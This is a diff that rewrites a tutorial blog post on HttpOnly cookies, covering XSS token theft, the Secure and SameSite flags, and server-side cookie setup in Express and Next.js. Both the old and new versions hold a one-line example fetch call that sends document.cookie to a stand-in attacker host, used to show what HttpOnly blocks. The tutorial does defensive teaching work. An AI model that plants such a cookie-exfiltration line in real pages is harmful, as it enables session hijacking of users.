@@ -1,6 +1,6 @@
 ---
-title: "Understanding HttpOnly Cookies in Depth"
-summary: "How HttpOnly cookies work, why they're essential for security, and how to use them safely in Next.js and Express."
+title: "Understanding HttpOnly Cookies: The Envelope JavaScript Can't Open"
+summary: "What the HttpOnly flag does, what it stops (token theft via XSS), what it doesn't, and how to set it in Express and Next.js."
 tags: ["cookies", "security", "web", "nextjs", "express"]
 publishedTime: "2025-10-14"
 level: "intermediate"
@@ -8,162 +8,139 @@ cover: "/assets/httponly-cookies-cover.jpg"
 coverAlt: "AI-generated illustration. The browser still sends the cookie with every request; scripts just can't reach in and read it."
 ---
 
-# 🍪 Understanding HttpOnly Cookies
+Open DevTools on a site you're logged into and type `document.cookie`. Your session cookie is usually missing from the output. The browser has it and sends it with every request, so why can't you see it?
 
-`HttpOnly` cookies are a type of browser cookie that **cannot be accessed via JavaScript**.  
-They are designed to protect sensitive data — especially **authentication tokens** — from attacks like **Cross-Site Scripting (XSS)**.
+Because it's marked `HttpOnly`.
 
----
+## The mental model: a sealed envelope
 
-## 🔍 What Does `HttpOnly` Mean?
+**An HttpOnly cookie is a sealed envelope the browser carries for you.** The browser delivers it to the server on every request, but JavaScript on the page can't open it, read it or change it.
 
-When you set the `HttpOnly` flag on a cookie, the browser stores it **but never exposes it to `document.cookie` or JavaScript APIs**.
+That's the whole idea. The server writes the envelope, the browser carries it, the server reads it. Scripts never touch it.
 
-That means:
+![Scripts are locked out of the jar, but the browser still attaches the cookie to requests they make. That is why HttpOnly limits XSS instead of stopping it.](/assets/httponly-cookies-flow.svg)
 
-```js
-console.log(document.cookie);
-// ❌ You will NOT see HttpOnly cookies here.
-```
+## How it works
 
-The cookie still goes to the server automatically with every HTTP request to the same origin.
-
----
-
-## ⚙️ How Browsers Enforce It
-
-Browsers handle HttpOnly cookies internally:
-1. The **server sets** a cookie with `Set-Cookie` header.
-2. The browser **stores it securely**.
-3. On every request to the same domain/path, the browser **attaches the cookie** in the `Cookie` header.
-4. JavaScript cannot read or modify it.
-
-✅ This prevents attackers from stealing session tokens via injected scripts.
-
----
-
-## 🚧 Why It's Important
-
-Without `HttpOnly`, an attacker who injects JavaScript (via XSS) could do:
-
-```js
-fetch('https://evil.com?cookie=' + document.cookie);
-```
-
-This would expose your session token.  
-With `HttpOnly`, that attack fails.
-
----
-
-## 💡 Secure + HttpOnly = Best Practice
-
-You should **always** combine:
-- `HttpOnly` → hides cookie from JavaScript
-- `Secure` → only send over HTTPS
-- `SameSite` → restricts cross-site sending (helps prevent CSRF)
-
-Example header:
+1. **The server sets the cookie** with a `Set-Cookie` response header and adds the `HttpOnly` flag.
+2. **The browser stores it** in its cookie jar like any other cookie.
+3. **On every matching request**, the browser attaches it in the `Cookie` header. You write no code for this.
+4. **JavaScript is locked out.** `document.cookie` skips it, and scripts can't overwrite it.
 
 ```http
-Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
+Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/
 ```
-
----
-
-## 🧱 Example: Express Backend
 
 ```js
-import express from "express";
-import cookieParser from "cookie-parser";
-
-const app = express();
-app.use(cookieParser());
-
-app.post("/login", (req, res) => {
-  const token = "user_jwt_token_here";
-  res.cookie("token", token, {
-    httpOnly: true,
-    secure: true,
-    sameSite: "strict",
-  });
-  res.send("Logged in!");
-});
-
-app.get("/profile", (req, res) => {
-  // You can access it on server:
-  const token = req.cookies.token;
-  res.json({ message: "Token exists?", token: !!token });
-});
-
-app.listen(3001, () => console.log("✅ Express running on port 3001"));
+console.log(document.cookie); // "theme=dark"  ← session is not there
 ```
 
----
+## Why it matters: XSS
 
-## ⚛️ Example: Next.js API Route
+**XSS** (cross-site scripting) means an attacker gets their own JavaScript running on your page, for example through an unescaped comment field. Without `HttpOnly`, one line sends your session to them:
+
+```js
+fetch("https://evil.example/steal?c=" + document.cookie);
+```
+
+Now they can log in as you from their own machine, for as long as the session lives. With `HttpOnly`, `document.cookie` comes back without the session, and **the token can't leave the browser**.
+
+**The honest stakes:** `HttpOnly` limits the damage of XSS, it doesn't stop it. While the attacker's script runs in your tab, it can still call your API, and the browser will attach the cookie for it. What it can't do is take the token away and reuse it later. You still need to prevent XSS itself (escape output, use a Content Security Policy).
+
+## The flags that travel with it
+
+`HttpOnly` is one of three flags you should set on a session cookie:
+
+| Flag | What it does | Helps against |
+|------|--------------|---------------|
+| `HttpOnly` | Hides the cookie from JavaScript | Token theft via XSS |
+| `Secure` | Sends it only over HTTPS | Sniffing on the network |
+| `SameSite=Lax` or `Strict` | Doesn't send it on most cross-site requests | CSRF (forged requests from other sites) |
+
+## In practice
+
+Set the cookie on the server, never from client JavaScript. A cookie created with `document.cookie` can't be `HttpOnly`, which defeats the point.
+
+**Express:**
+
+```js
+app.post("/login", (req, res) => {
+  const token = createSession(req.body); // your own login logic
+  res.cookie("session", token, {
+    httpOnly: true,
+    secure: true,
+    sameSite: "lax",
+    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days, in ms
+  });
+  res.json({ ok: true });
+});
+
+app.get("/me", (req, res) => {
+  const token = req.cookies.session; // needs cookie-parser
+  // validate the token, load the user...
+});
+```
+
+**Next.js (App Router route handler):**
 
 ```ts
-// pages/api/login.ts
-import type { NextApiRequest, NextApiResponse } from "next";
-import { serialize } from "cookie";
+// app/api/login/route.ts
+import { cookies } from "next/headers";
 
-export default function handler(req: NextApiRequest, res: NextApiResponse) {
-  const token = "jwt_token_here";
+export async function POST(request: Request) {
+  const token = await createSession(await request.json());
 
-  res.setHeader(
-    "Set-Cookie",
-    serialize("token", token, {
-      httpOnly: true,
-      secure: process.env.NODE_ENV === "production",
-      sameSite: "strict",
-      maxAge: 60 * 60 * 24 * 7, // 7 days
-      path: "/",
-    })
-  );
+  const cookieStore = await cookies();
+  cookieStore.set("session", token, {
+    httpOnly: true,
+    secure: process.env.NODE_ENV === "production",
+    sameSite: "lax",
+    path: "/",
+    maxAge: 60 * 60 * 24 * 7, // 7 days, in seconds
+  });
 
-  res.status(200).json({ success: true });
+  return Response.json({ ok: true });
 }
 ```
 
-Now your cookie is automatically sent with every request — **but never visible to `document.cookie`**.
+Note the trap: Express `maxAge` is in milliseconds, Next.js `maxAge` is in seconds.
 
----
+**Before → after:** if your app stores a JWT in `localStorage` and adds it to an `Authorization` header, any XSS can read and send it away. Move it into an `HttpOnly` cookie and that one-line theft stops working.
 
-## 🧠 Behind the Scenes
+## Say it in an interview
 
-When you refresh the page:
-- Browser checks stored cookies for matching domain/path.
-- Attaches them automatically in the `Cookie` header.
-- Server reads them and can validate session or JWT.
+> "An HttpOnly cookie can't be read or changed by JavaScript. The browser still sends it with every request, so the server can use it for the session. It protects auth tokens from being stolen through XSS. It doesn't stop XSS itself, because an injected script can still make requests as the user, so you pair it with Secure, SameSite and output escaping."
 
-No need for localStorage or client-side access.
+## Cheat sheet
 
-This **reduces attack surface dramatically** — because even if the client is compromised, tokens aren’t exposed to script access.
+- **HttpOnly** = the browser sends the cookie, scripts can't read it.
+- Set it **from the server** with `Set-Cookie`. Client JS can't create an HttpOnly cookie.
+- It stops **token theft**, not XSS itself.
+- Use it with **`Secure`** and **`SameSite`** on every session cookie.
+- Prefer it over `localStorage` for auth tokens.
 
----
+<DeepDive>
 
-## ⚔️ Common Mistakes
+### What HttpOnly doesn't protect
 
-❌ Setting cookies in client-side JS → breaks security  
-✅ Always set cookies via `Set-Cookie` header from server.
+- **Requests made from the page.** An injected script can `fetch("/api/transfer", { method: "POST" })` and the browser attaches the cookie. HttpOnly only stops reading the value.
+- **CSRF.** A form on another site can still trigger a request that carries the cookie. `SameSite=Lax` blocks most of these; for sensitive actions, add a CSRF token too.
+- **Tampering by the user.** Anyone can edit their own cookies in DevTools. If a cookie holds data, the server must validate or sign it.
 
-❌ Storing JWTs in `localStorage`  
-✅ Store them in `HttpOnly` cookies instead.
+### SameSite values
 
----
+- `Strict`: never sent on cross-site requests, not even when you click a link from another site to yours. Safest, but users arriving from a link look logged out on the first page.
+- `Lax`: sent on top-level navigations (clicking a link), not on cross-site `fetch`, forms that POST, or iframes. A good default for session cookies, and the browser default when `SameSite` is missing in Chrome.
+- `None`: always sent, and requires `Secure`. Only for cookies that must work cross-site, such as embedded widgets.
 
-## 🔐 Summary
+### Cookie prefixes
 
-| Feature | Description | Prevents |
-|----------|--------------|-----------|
-| **HttpOnly** | Hides cookie from JavaScript | XSS |
-| **Secure** | Sends only over HTTPS | MITM |
-| **SameSite** | Restricts cross-site | CSRF |
-| **Server-set cookie** | Controlled by backend | Tampering |
+Name a cookie `__Host-session` and the browser only accepts it if it has `Secure`, `Path=/` and no `Domain`. That stops a subdomain from overwriting your session cookie. `__Secure-` only requires `Secure`.
 
----
+### Further reading
 
-## 🚀 Key Takeaway
+- [MDN: Using HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies)
+- [MDN: Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie)
+- [OWASP: Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
 
-> Store your auth tokens in HttpOnly cookies, not in localStorage.  
-> They protect against XSS by design — one of the simplest and strongest web security patterns.
+</DeepDive>
